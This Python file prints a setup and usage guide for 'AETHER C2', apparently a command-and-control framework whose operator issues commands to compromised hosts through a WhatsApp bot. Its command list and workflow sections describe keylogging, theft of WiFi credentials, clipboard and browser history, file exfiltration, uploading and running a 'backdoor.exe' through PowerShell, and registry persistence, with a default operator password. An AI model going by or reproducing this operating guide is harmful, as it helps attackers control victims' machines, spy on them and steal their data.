#!/usr/bin/env python3
"""
AETHER WhatsApp Bot Setup and Usage Guide
Complete guide for WhatsApp Bot integration with AETHER C2
"""

SETUP_GUIDE = """
╔═══════════════════════════════════════════════════════════════════════╗
║     AETHER C2 - WhatsApp Bot Integration Setup Guide                 ║
╚═══════════════════════════════════════════════════════════════════════╝

📱 OVERVIEW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

The AETHER C2 framework integrates with Baileys WhatsApp bot for:
✓ Remote command execution via WhatsApp
✓ Mobile-friendly C2 interface
✓ Secure authentication per user
✓ Session management
✓ Command history and logging

🚀 QUICK START
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. SETUP WhatsApp Bot (Baileys)

   $ cd WA-BOT-Base
   $ npm install
   $ npm start
   
   This will:
   - Install Baileys dependencies
   - Generate QR code for WhatsApp login
   - Start listening for messages

2. SCAN QR CODE

   When you run `npm start`, you'll see a QR code in the terminal.
   
   On your phone:
   - Open WhatsApp → Settings → Linked Devices
   - Scan the QR code with your phone
   - Bot now receives all messages
   
   ⚠️ WARNING: Use a test WhatsApp account!

3. SETUP AETHER SERVER

   $ cd /workspaces/test
   $ python3 server/aether_server.py
   
   In another terminal:
   AETHER> whatsapp enable
   AETHER> whatsapp config

4. ENABLE AETHER IN BOT (Optional - Advanced)

   To enable automatic message routing, edit WA-BOT-Base/main.js:
   
   Add at the top of startSocket():
   ```javascript
   import { initializeAETHER } from './aether-integration.js';
   const aetherHandler = initializeAETHER(sock, {
       aetherHost: 'http://localhost',
       aetherPort: 5000,
       apiKey: 'your-key',
   });
   ```

🎮 WHATSAPP COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

AUTHENTICATION
  *auth <password>*      - Authenticate with AETHER
  
  Example:
  Message: auth aether2025
  Response: ✅ Authorized! Welcome to AETHER

SESSION MANAGEMENT
  *link <session_id>*    - Link to an agent session
  *unlink*              - Unlink from current session
  *sessions*            - List all available sessions
  *status*              - Show current session info
  
  Example:
  Message: link agent_001
  Response: ✅ Linked to session: agent_001
  
  Message: sessions
  Response: 📋 Active Sessions:
            • agent_001: DESKTOP-ABC
            • agent_002: DESKTOP-XYZ

SYSTEM INFORMATION
  *whoami*              - Current user
  *hostname*            - System hostname
  *sysinfo*             - System information
  *ps*                  - List processes
  
  Example:
  Message: whoami
  Response: ✅ Result: admin

FILE OPERATIONS
  *ls <path>*           - List directory
  *pwd*                 - Current directory
  *cat <file>*          - Read file
  *cd <path>*           - Change directory
  *download <file>*     - Download file from target
  *upload <file>*       - Upload file to target

INTELLIGENCE GATHERING
  *screenshot*          - Capture screen
  *keylog start*        - Start keylogger
  *keylog stop*         - Stop keylogger
  *clipboard*           - Get clipboard contents
  *wifi*                - WiFi credentials
  *browser*             - Browser history

HELP & DOCUMENTATION
  *help*                - Show help menu
  *history*             - Command history
  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ COMMAND SHORTCUTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For faster communication, use shortcuts:

System Info:      w (whoami), h (hostname), s (sysinfo), p (ps)
File Ops:         l (ls), c (cat), d (download), u (upload)
Process:          k (kill), ss (screenshot), kl (keylog)
Sessions:         sess (sessions), stat (status), hist (history)

WORKFLOW EXAMPLE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Authenticate:
   Send: auth aether2025
   
2. List sessions:
   Send: sessions
   Response shows available agents

3. Link to agent:
   Send: link agent_001
   
4. Gather reconnaissance:
   Send: whoami
   Send: hostname
   Send: ps
   Send: screenshot
   
5. Take action:
   Send: download C:\\Users\\admin\\documents\\file.txt

FILE STRUCTURE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WA-BOT-Base/
├── aether-bridge.js        # Main bridge to AETHER
├── aether-handler.js       # Message routing handler
├── aether-integration.js   # Integration helpers
├── main.js                 # Baileys main entry point
├── handler.js              # Command handler
├── index.js                # Cluster manager
├── package.json            # Dependencies
└── data/                   # Session storage

PYTHON INTEGRATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

The AETHER Python server includes WhatsApp support:

server/comms/
├── whatsapp_bridge.py      # Python WhatsApp bridge
├── webhook_handler.py      # Webhook receiver
├── whatsapp_config.py      # Configuration
└── WHATSAPP_GUIDE.py       # This guide

SERVER COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

From AETHER server, manage WhatsApp:

  AETHER> whatsapp enable              - Start WhatsApp listener
  AETHER> whatsapp disable             - Stop listener
  AETHER> whatsapp status              - Show status
  AETHER> whatsapp authorize <phone>   - Add user
  AETHER> whatsapp revoke <phone>      - Remove user
  AETHER> whatsapp link <phone> <id>   - Link to session
  AETHER> whatsapp config              - Show configuration
  AETHER> whatsapp test <phone> <msg>  - Send test message

🔐 SECURITY BEST PRACTICES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✓ Change default authentication password
  Edit whatsapp_config.py:
  auth_password = 'your_strong_password'

✓ Use a dedicated WhatsApp account
  Don't use your personal account
  Consider a temporary number

✓ Enable rate limiting
  Prevent brute force attempts
  Configure in whatsapp_config.py:
  commands_per_minute = 10
  messages_per_minute = 20

✓ Whitelist authorized numbers
  Only add numbers you trust
  Use: whatsapp authorize <phone>

✓ Monitor command history
  Review logs regularly
  Enable logging in config

✓ Revoke compromised accounts
  Use: whatsapp revoke <phone>

🐛 TROUBLESHOOTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Q: QR code not appearing
A: Make sure your phone has WhatsApp installed
   Try: npm start in WA-BOT-Base directory
   Check terminal output

Q: "Unauthorized access attempt"
A: Authentication failed
   Use: auth <password>
   Check password in whatsapp_config.py

Q: "No session linked"
A: Must link to agent first
   Use: link <session_id>
   Use: sessions to list available

Q: Commands not executing
A: Check AETHER server is running
   Verify WhatsApp is enabled
   Check command syntax

Q: Messages too long
A: WhatsApp has 4096 char limit
   Results truncated in messages
   Check server logs for full output

Q: Bot stops responding
A: Check WhatsApp login still active
   May need to rescan QR code
   Restart bot: npm start

ENVIRONMENT VARIABLES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Set these in your shell environment:

AETHER_HOST=http://localhost
AETHER_PORT=5000
AETHER_API_KEY=your-api-key
AETHER_USERS=+1234567890,+0987654321

Or in .env file for the bot project.

API ENDPOINTS (Python Server)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

POST /webhook/whatsapp
  Receive incoming messages
  Body: {from: "+1234567890", text: "command"}

POST /api/whatsapp/authorize
  Add authorized user
  Body: {phone: "+1234567890"}

POST /api/whatsapp/link
  Link user to session
  Body: {phone: "+1234567890", session_id: "agent_001"}

GET /api/whatsapp/status
  Get bridge status

💡 ADVANCED USAGE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BATCH COMMANDS:
Send multiple commands (if enabled):
  whoami; hostname; ps

COMMAND HISTORY:
View recent commands you've executed:
  history

EXPORT CONFIGURATION:
  whatsapp export-config

CUSTOM HANDLERS:
Create custom message handlers in aether-handler.js
Add routes in handleMessagesWithAETHER function

📚 EXAMPLES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Full reconnaissance workflow:

1. auth aether2025                    [Authenticate]
2. sessions                           [List agents]
3. link agent_001                     [Select agent]
4. whoami                             [Check user]
5. hostname                           [System name]
6. sysinfo                            [System details]
7. ps                                 [Processes]
8. screenshot                         [Visual recon]
9. ls C:\\Users\\admin\\Documents     [Directory listing]
10. cat C:\\Users\\admin\\Documents\\file.txt  [Read file]
11. download C:\\Users\\admin\\Documents\\file.txt  [Exfil]

File operations example:

1. link agent_001
2. ls C:\\
3. cd C:\\Windows\\Temp
4. upload backdoor.exe
5. execute powershell.exe .\backdoor.exe

PERSISTENCE workflow:

1. link agent_001
2. persist registry
3. beacon_config
4. status

VERSION INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

AETHER WhatsApp Integration v1.0

Components:
  - Baileys WhatsApp Library
  - AETHER C2 Framework
  - Python WhatsApp Bridge
  - Node.js Bot Integration

Requirements:
  - Node.js 14+
  - Python 3.6+
  - WhatsApp account (dedicated)
  - Network access to AETHER server

SUPPORT & RESOURCES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Documentation:
  - This guide (WHATSAPP_SETUP.py)
  - aether-bridge.js - Bridge logic
  - aether-handler.js - Message handling
  - whatsapp_config.py - Configuration

GitHub Resources:
  - https://github.com/WhiskeySockets/Baileys
  - https://github.com/adiwajshing/Baileys

License: See LICENSE file in project root

"""

def print_setup_guide():
    """Print the setup guide"""
    print(SETUP_GUIDE)

def print_quick_start():
    """Print quick start instructions"""
    quick_start = """
🚀 QUICK START (2 Minutes)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Start WhatsApp Bot:
   $ cd WA-BOT-Base && npm start
   
2. Scan QR code with WhatsApp

3. Start AETHER server (new terminal):
   $ python3 server/aether_server.py

4. Enable WhatsApp in AETHER:
   AETHER> whatsapp enable

5. Send message to bot:
   "auth aether2025"
   "sessions"
   "link agent_001"
   "whoami"

Done! You can now control agents via WhatsApp!
    """
    print(quick_start)

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == '--quick':
        print_quick_start()
    else:
        print_setup_guide()
